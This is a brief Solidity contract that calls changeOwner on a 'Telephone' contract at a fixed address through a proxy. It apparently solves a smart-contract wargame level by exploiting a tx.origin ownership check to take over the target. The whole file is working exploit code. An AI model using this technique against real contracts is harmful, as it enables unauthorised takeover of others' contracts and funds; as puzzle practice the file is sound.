// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract TelephoneProxy {
    
    address constant TELEPHONE_CONTRACT = 0xEDcC0A5C3226B2dC598DE024891c056f95AD2aed;
    
    function makeCall() public returns (bool) {
        Telephone t = Telephone(TELEPHONE_CONTRACT);
        
        t.changeOwner(msg.sender);
        
        return true;
    }
}

abstract contract Telephone {
    function changeOwner(address _owner) virtual public;
}